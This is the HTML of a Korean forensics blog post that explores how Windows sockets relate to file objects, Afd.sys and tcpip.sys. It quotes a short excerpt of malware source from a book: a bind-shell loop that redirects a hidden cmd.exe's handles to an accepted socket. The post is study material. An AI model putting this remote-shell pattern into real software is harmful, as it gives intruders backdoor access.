@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>(포렌식)소켓의 실체는 무엇인가?</title>
+  <meta name="description" content="배경지식">
+  
+  <meta name="author" content="Pragmo">
+  <meta name="copyright" content="&copy; Pragmo 2023">
+  
+
+  <!-- External libraries -->
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/monokai-sublime.min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/css/lightbox.css">
+
+  <!-- Favicon and other icons (made with http://www.favicon-generator.org/) -->
+  <link rel="shortcut icon" href="/assets/icons/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon">
+  <link rel="apple-touch-icon" sizes="57x57" href="/assets/icons/apple-icon-57x57.png">
+  <link rel="apple-touch-icon" sizes="60x60" href="/assets/icons/apple-icon-60x60.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="/assets/icons/apple-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/assets/icons/apple-icon-76x76.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="/assets/icons/apple-icon-114x114.png">
+  <link rel="apple-touch-icon" sizes="120x120" href="/assets/icons/apple-icon-120x120.png">
+  <link rel="apple-touch-icon" sizes="144x144" href="/assets/icons/apple-icon-144x144.png">
+  <link rel="apple-touch-icon" sizes="152x152" href="/assets/icons/apple-icon-152x152.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/icons/apple-icon-180x180.png">
+  <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icons/android-icon-192x192.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="96x96" href="/assets/icons/favicon-96x96.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/icons/favicon-16x16.png">
+  <link rel="manifest" href="/assets/icons/manifest.json">
+  <meta name="msapplication-TileColor" content="#ffffff">
+  <meta name="msapplication-TileImage" content="/assets/icons/ms-icon-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  
+  <!-- Facebook OGP cards -->
+  <meta property="og:description" content="배경지식" />
+  <meta property="og:url" content="https://pragmob.github.io//forensic/2022/09/20/(%ED%8F%AC%EB%A0%8C%EC%8B%9D)%EC%86%8C%EC%BC%93%EC%9D%98-%EC%8B%A4%EC%B2%B4%EB%8A%94-%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80.html">
+  <meta property="og:site_name" content="플래그모의 리포지토리" />
+  <meta property="og:title" content="(포렌식)소켓의 실체는 무엇인가?" />
+  <meta property="og:type" content="website" />
+  <meta property="og:image" content="https://pragmob.github.io//assets/logo.png" />
+  <meta property="og:image:type" content="image/png" />
+  <meta property="og:image:width" content="612" />
+  <meta property="og:image:height" content="605" />
+  
+
+  
+  <!-- Twitter: card tags -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="(포렌식)소켓의 실체는 무엇인가?">
+  <meta name="twitter:description" content="배경지식">
+  <meta name="twitter:image" content="https://pragmob.github.io//assets/logo.png">
+  <meta name="twitter:url" content="https://pragmob.github.io//forensic/2022/09/20/(%ED%8F%AC%EB%A0%8C%EC%8B%9D)%EC%86%8C%EC%BC%93%EC%9D%98-%EC%8B%A4%EC%B2%B4%EB%8A%94-%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80.html">
+  
+
+  
+
+  <!-- Site styles -->
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://pragmob.github.io//forensic/2022/09/20/(%ED%8F%AC%EB%A0%8C%EC%8B%9D)%EC%86%8C%EC%BC%93%EC%9D%98-%EC%8B%A4%EC%B2%B4%EB%8A%94-%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80.html">
+	<link rel="alternate" type="application/rss+xml" title="플래그모의 리포지토리" href="https://pragmob.github.io//feed.xml" />
+	
+	<!-- Tooltips -->
+	<script type="text/javascript">
+		window.tooltips = []
+	</script>
+
+  
+</head>
+
+
+  <body>
+
+    <header class="navigation" role="banner">
+  <div class="navigation-wrapper">
+    <a href="/" class="logo">
+      
+      <img src="/assets/logo.jpg" alt="플래그모의 리포지토리">
+      
+    </a>
+    <a href="javascript:void(0)" class="navigation-menu-button" id="js-mobile-menu">
+      <i class="fa fa-bars"></i>
+    </a>
+    <nav role="navigation">
+      <ul id="js-navigation-menu" class="navigation-menu show">
+				
+	
+
+	
+
+	
+
+	
+	<li class="nav-link"><a href="/posts/">Posts</a>
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+        <div class="post">
+
+<div class="post-header-container " >
+  <div class="scrim ">
+    <header class="post-header">
+      <h1 class="title">(포렌식)소켓의 실체는 무엇인가?</h1>
+      <p class="info">by <strong>Pragmo</strong></p>
+    </header>
+  </div>
+</div>
+
+<div class="wrapper">
+
+ <span class="page-divider">
+  <span class="one"></span>
+  <span class="two"></span>
+</span>
+ 
+
+<section class="post-meta">
+  <div class="post-date">September 20, 2022</div>
+  <div class="post-categories">
+  in 
+    
+    <a href="/category/forensic">Forensic</a>
+    
+  
+  </div>
+</section>
+
+<article class="post-content">
+  <h1 id="배경지식">배경지식</h1>
+
+<p>콘솔 프로그램이 실행될때 프로그램 내부에선 입력을 받는 입력버퍼의 핸들과 출력을 내는 출력버퍼의 핸들, 오류메시지를 내는 버퍼의 핸들을 가지고 있다</p>
+
+<p>즉 printf로 문자열을 출력한다는건 곧 출력버퍼의 핸들을 통해 출력버퍼에 값을 쓰는 행위이고 scanf로 문자열 값을 받는다는건 입력버퍼의 핸들을 통해 입력버퍼를 읽어들이는 행위이다</p>
+
+<p>얼마 전에 이 사실을 직접 관찰하고 싶어서 올리디버거로 printf 내부를 들여다봤다</p>
+
+<p>아니나 다를까 내부적으로 WriteFile을 호출한다</p>
+
+<p>출력버퍼라는 _FILE_OBJECT에 값을 쓰는 것이다</p>
+
+<p>scanf도 역시 내부적으로 ReadFile을 호출한다</p>
+
+<p>그 후 메모리 포렌식(혜지원)이라는 책을 읽다가 297p에서 어떤 악성코드의 소스코드를 봤는데 내용이 충격적이었다</p>
+
+<p>아래는 소스코드의 일부이다</p>
+
+<pre><code class="language-C">while(1)
+{
+    myCliSock = SOCKET_ERROR;
+    while(myCliSock == SOCKET_ERROR)
+    {
+        Sleep(1);
+        listen(myMainSock, SOMAXCONN);
+        ulSzSockAddr = sizeof(myCliSockAddr);
+        myCliSock = accept(myMainSock, (SOCKADDR*)&amp;myCliSockAddr, (int*)&amp;ulSzSockAddr);
+    }
+    memset(&amp;mySi, 0, sizeof(mySi));
+    memset(&amp;myPi, 0, sizeof(myPi));
+
+    mySi.wShowWindow = SW_HIDE;
+    mySi.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+
+    // 입출력 핸들을 소켓 핸들로 교체함
+    mySi.hStdError = (VOID*)myCliSock;
+    mySi.hStdInput = (VOID*)myCliSock;
+    mySi.hStdOutput = (VOID*)myCliSock;
+    CreateProcess(0, wcsdup(L"cmd.exe"), 0, 0, 1 /* 핸들 테이블 상속 = 1 */, 0, 0, 0, &amp;mySi, &amp;myPi);
+}
+</code></pre>
+
+<p>그냥 원격 쉘 실행 프로그램인데, 구현을 어떻게 했는지 보니 소스코드에 나와있듯이 cmd.exe의 입출력 핸들값을 해커와의 연결이 형성된 소켓의 핸들값으로 교체후 자식 프로세스로 실행하는 식으로 동작했다</p>
+
+<p>즉 cmd.exe가 실행되면 입출력을 수행할 때마다 소켓을 ReadFile또는 WriteFile로 조작하게 된다</p>
+
+<p>그렇다면 소켓도 역시 _FILE_OBJECT로 할당이 되어있는것인가?</p>
+
+<p>궁금해서 직접 소스를 짜보니 소켓통신도 send나 recv대신에 WriteFile이나 ReadFile로 가능하긴 했다!</p>
+
+<p>그래 그렇구나, 소켓도 커널 풀에는 File로 할당이 되어있구나 생각했었다</p>
+
+<p>그러나 메모리 포렌식 책의 네트워크 파트를 읽으며 조금 혼란이 오기 시작했다</p>
+
+<p>책의 그림 11-1과 11-2에서 socket()은 \Device\Afd\Endpoint의 핸들을 연다고 나와있다</p>
+
+<p>이건 커널 모드의 Afd.sys와 통신하기 위한 오브젝트인데 Afd.sys는 Winsock2를 보조한다고 한다</p>
+
+<p>여기서 추측할 수 있는 바로 socket()이 반환하는 값은 \Device\Afd\Endpoint의 핸들값일 것이다</p>
+
+<p>이후 bind()나 connect()를 할 때 \Device\Tcp의 핸들을 추가로 연다</p>
+
+<p>\Device\Tcp는 tcpip.sys 드라이버와 관련이 있는 것 같은 느낌인데 책의 그림 11-4에 나온대로 tcpip.sys는 _TCP_ENDPOINT, _TCP_LISTENER, _UDP_ENDPOINT라는 연결 관련 정보를 관리하기 때문에</p>
+
+<p>해당 구조의 흔적을 토대로 메모리에서 통신 기록 포렌식이 가능하다는게 책의 네트워크 파트 내용이다</p>
+
+<h1 id="소켓의-실체에-관한-의문점">소켓의 실체에 관한 의문점</h1>
+
+<p>그럼 \Device\Afd\Endpoint는 연결과 관련돤 정보를 관리하지 않는 건가?</p>
+
+<p>아니 애초에 \Device\Afd\Endpoint는 _FILE_OBJECT로 확인이 되는데 연결정보는 어떻게 관리하나</p>
+
+<p>해서 둘이 어떻게 연결이 되는지 찾아봤는데 영어로 검색해도 정보가 많지않다 사람들이 관심이 없는건지..</p>
+
+<p>지금까지의 의문점을 정리하면</p>
+
+<blockquote>
+  <ol>
+    <li>소켓(\Device\Afd\Endpoint)과 네트워크 연결정보(_TCP_ENDPOINT, _TCP_LISTENER, _UDP_ENDPOINT)는 어떻게 연결이 되는가</li>
+    <li>\Device\Afd\Endpoint는 File인데 네트워크 연결정보를 관리할 수 있는가</li>
+  </ol>
+</blockquote>
+
+<p>정도이다</p>
+
+<p>정보가 너무 없기때문에 감히 내가 추측해보기로는</p>
+
+<blockquote>
+  <ol>
+    <li>\Device\Afd\Endpoint에서 데이터를 형식을 갖춰 저장한다</li>
+    <li>\Device\Afd\Endpoint자체에서 네트워크 연결 정보를 저장하는게 아니라 Afd.sys측에서 어떤 테이블 구조를 가지고 있다</li>
+  </ol>
+</blockquote>
+
+<p>이렇게 한참을 고민하다가 네이버에서 배포한 <a href="https://d2.naver.com/helloworld/47667">문서</a>를 찾았다</p>
+
+<p>리눅스 소켓의 구조에 관한 설명이 깔끔하게 정리되어있다</p>
+
+<p>문서에 따르면 리눅스 소켓은 일단 File이 맞다고 한다</p>
+
+<p>근데 File구조에서 Socket구조체를 연결하기 때문에 이를 통해서 네트워크 정보를 찾을 수 있다고 한다</p>
+
+<p>윈도우도 비슷할 것이라 생각해 _FILE_OBJECT구조를 뜯어보니 _DEVICE_OBJECT에 대한 포인터나 _IO_COMPLETION_CONTEXT에 대한 포인터 등 뭔가 이어지는 분위기의 멤버들이 보인다</p>
+
+<p>그래서 아마도 윈도우도 비슷하지 않을까? 생각해서</p>
+
+<h1 id="잠정-결론">잠정 결론</h1>
+
+<p>소켓은 _FILE_OBJECT이고 _FILE_OBJECT의 멤버중에서 네트워크 정보로 연결되는 포인터가 있다 정도로 정리하고 다음파트 공부하려고 한다</p>
+
+</article>
+
+
+
+
+
+<section class="rss">
+  <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
+</section>
+
+<section class="share">
+  <span>Share: </span>
+  
+    
+    
+      <a href="//twitter.com/share?text=%28%ED%8F%AC%EB%A0%8C%EC%8B%9D%29%EC%86%8C%EC%BC%93%EC%9D%98+%EC%8B%A4%EC%B2%B4%EB%8A%94+%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80%3F&url=https%3A%2F%2Fpragmob.github.io%2F%2Fforensic%2F2022%2F09%2F20%2F%28%25ED%258F%25AC%25EB%25A0%258C%25EC%258B%259D%29%25EC%2586%258C%25EC%25BC%2593%25EC%259D%2598-%25EC%258B%25A4%25EC%25B2%25B4%25EB%258A%2594-%25EB%25AC%25B4%25EC%2597%2587%25EC%259D%25B8%25EA%25B0%2580.html&via="
+        onclick="window.open(this.href, 'twitter-share', 'width=550,height=255');return false;">
+        <i class="fa fa-twitter-square fa-lg"></i>
+      </a>
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+      <a href="//www.facebook.com/sharer.php?t=%28%ED%8F%AC%EB%A0%8C%EC%8B%9D%29%EC%86%8C%EC%BC%93%EC%9D%98+%EC%8B%A4%EC%B2%B4%EB%8A%94+%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80%3F&u=https%3A%2F%2Fpragmob.github.io%2F%2Fforensic%2F2022%2F09%2F20%2F%28%25ED%258F%25AC%25EB%25A0%258C%25EC%258B%259D%29%25EC%2586%258C%25EC%25BC%2593%25EC%259D%2598-%25EC%258B%25A4%25EC%25B2%25B4%25EB%258A%2594-%25EB%25AC%25B4%25EC%2597%2587%25EC%259D%25B8%25EA%25B0%2580.html"
+        onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
+        <i class="fa fa-facebook-square fa-lg"></i>
+      </a>
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+      <a href="//www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fpragmob.github.io%2F%2Fforensic%2F2022%2F09%2F20%2F%28%25ED%258F%25AC%25EB%25A0%258C%25EC%258B%259D%29%25EC%2586%258C%25EC%25BC%2593%25EC%259D%2598-%25EC%258B%25A4%25EC%25B2%25B4%25EB%258A%2594-%25EB%25AC%25B4%25EC%2597%2587%25EC%259D%25B8%25EA%25B0%2580.html"
+        onclick="window.open(this.href, 'linkedin-share', 'width=550,height=255');return false;">
+        <i class="fa fa-linkedin-square fa-lg"></i>
+      </a>
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      <a href="//plus.google.com/share?title=%28%ED%8F%AC%EB%A0%8C%EC%8B%9D%29%EC%86%8C%EC%BC%93%EC%9D%98+%EC%8B%A4%EC%B2%B4%EB%8A%94+%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80%3F&url=https%3A%2F%2Fpragmob.github.io%2F%2Fforensic%2F2022%2F09%2F20%2F%28%25ED%258F%25AC%25EB%25A0%258C%25EC%258B%259D%29%25EC%2586%258C%25EC%25BC%2593%25EC%259D%2598-%25EC%258B%25A4%25EC%25B2%25B4%25EB%258A%2594-%25EB%25AC%25B4%25EC%2597%2587%25EC%259D%25B8%25EA%25B0%2580.html"
+        onclick="window.open(this.href, 'google-plus-share', 'width=550,height=255');return false;">
+        <i class="fa fa-google-plus-square fa-lg"></i>
+      </a>
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+      <a href="//www.pinterest.com/pin/create/button/?description=%28%ED%8F%AC%EB%A0%8C%EC%8B%9D%29%EC%86%8C%EC%BC%93%EC%9D%98+%EC%8B%A4%EC%B2%B4%EB%8A%94+%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80%3F&url=https%3A%2F%2Fpragmob.github.io%2F%2Fforensic%2F2022%2F09%2F20%2F%28%25ED%258F%25AC%25EB%25A0%258C%25EC%258B%259D%29%25EC%2586%258C%25EC%25BC%2593%25EC%259D%2598-%25EC%258B%25A4%25EC%25B2%25B4%25EB%258A%2594-%25EB%25AC%25B4%25EC%2597%2587%25EC%259D%25B8%25EA%25B0%2580.html&media=https://pragmob.github.io//assets/logo.jpg"
+        onclick="window.open(this.href, 'pinterest-share', 'width=550,height=255');return false;">
+        <i class="fa fa-pinterest-square fa-lg"></i>
+      </a>
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+      <a href="//www.reddit.com/submit" onclick="window.location = '//www.reddit.com/submit?url=' + encodeURIComponent('https://pragmob.github.io//forensic/2022/09/20/(%ED%8F%AC%EB%A0%8C%EC%8B%9D)%EC%86%8C%EC%BC%93%EC%9D%98-%EC%8B%A4%EC%B2%B4%EB%8A%94-%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80.html') + '&title=(포렌식)소켓의 실체는 무엇인가?'; return false">
+        <i class="fa fa-reddit-square fa-lg"></i>
+      </a>
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+</section>
+
+	<section class="post-navigation">
+		<span class="prev-post">
+			
+				<a href="/forensic/2022/09/15/%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%82%B4-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%8A%B8%EB%A6%AC-%ED%95%98%EC%9D%B4%EB%B8%8C-%EA%B5%AC%EC%A1%B0-%EC%A0%95%EB%A6%AC.html">
+					<span class="fa-stack fa-lg">
+						<i class="fa fa-square fa-stack-2x"></i>
+						<i class="fa fa-angle-double-left fa-stack-1x fa-inverse"></i>
+					</span>
+					<span class="page-number">메모리 내 레지스트리 하이브 구조 정리</span>
+				</a>
+			
+		</span>
+		<span class="next-post">
+			
+				<a href="/forensic/2022/09/22/%EB%A9%94%EB%AA%A8%EB%A6%AC-%ED%8F%AC%EB%A0%8C%EC%8B%9D-1%EB%8F%85-%ED%9B%84-%EA%B3%84%ED%9A%8D.html">
+					<span class="page-number">메모리 포렌식 1독 후 계획</span>
+					<span class="fa-stack fa-lg">
+						<i class="fa fa-square fa-stack-2x"></i>
+						<i class="fa fa-angle-double-right fa-stack-1x fa-inverse"></i>
+					</span>
+				</a>
+			
+		</span>
+	</section>
+
+
+
+
+<!-- github comments -->
+<section class="github-comments">
+  <script src="https://utteranc.es/client.js"
+    repo="PragmoB/blog-comments"
+    issue-term="pathname"
+    theme="github-light"
+    crossorigin="anonymous"
+    async>
+  </script>
+</section>
+
+</div>
+</div>
+
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h3 class="footer-heading">플래그모의 리포지토리</h3>
+
+    <div class="site-navigation">
+
+      <p><strong>Site Map</strong></p>
+      <ul class="pages">
+				
+	
+
+	
+
+	
+
+	
+	<li class="nav-link"><a href="/posts/">Posts</a>
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+
+      </ul>
+    </div>
+
+    <div class="site-contact">
+
+      <p><strong>Contact</strong></p>
+      <ul class="social-media-list">
+        <li>
+          <a href="mailto:peullaegeumo@gmail.com">
+            <i class="fa fa-envelope-o"></i>
+            <span class="username">peullaegeumo@gmail.com</span>
+          </a>
+        </li>
+
+        
+          
+        
+          
+        
+          
+          <li>
+            <a href="https://github.com/PragmoB" title="Fork me on GitHub">
+              <i class="fa fa-github"></i>
+              <span class="username">PragmoB</span>
+            </a>
+          </li>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+
+      </ul>
+    </div>
+
+    <div class="site-signature">
+      <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
+      <p class="text">공부하고 경험했던 내용들을 정리해서 올리고 있습니다. 어서오세요
+</p>
+    </div>
+
+  </div>
+
+</footer>
+
+<!-- Scripts -->
+<script src="//code.jquery.com/jquery-3.4.1.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/highlight.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/js/lightbox.min.js"></script>
+<script src="//unpkg.com/popper.js@1"></script>
+<script src="//unpkg.com/tippy.js@5"></script>
+
+<script type="text/javascript">
+$(document).ready(function() {
+  // Default syntax highlighting
+  hljs.initHighlightingOnLoad();
+
+  // Header
+  var menuToggle = $('#js-mobile-menu').unbind();
+  $('#js-navigation-menu').removeClass("show");
+  menuToggle.on('click', function(e) {
+    e.preventDefault();
+    $('#js-navigation-menu').slideToggle(function(){
+      if($('#js-navigation-menu').is(':hidden')) {
+        $('#js-navigation-menu').removeAttr('style');
+      }
+    });
+  });
+
+	// Enable tooltips via Tippy.js
+	if (Array.isArray(window.tooltips)) {
+		window.tooltips.forEach(function(tooltip) {
+			var selector = tooltip[0];
+			var config = tooltip[1];
+			tippy(selector, config);
+		})
+	}
+});
+
+</script>
+
+
+
+
+
+
+  </body>
+
+</html>
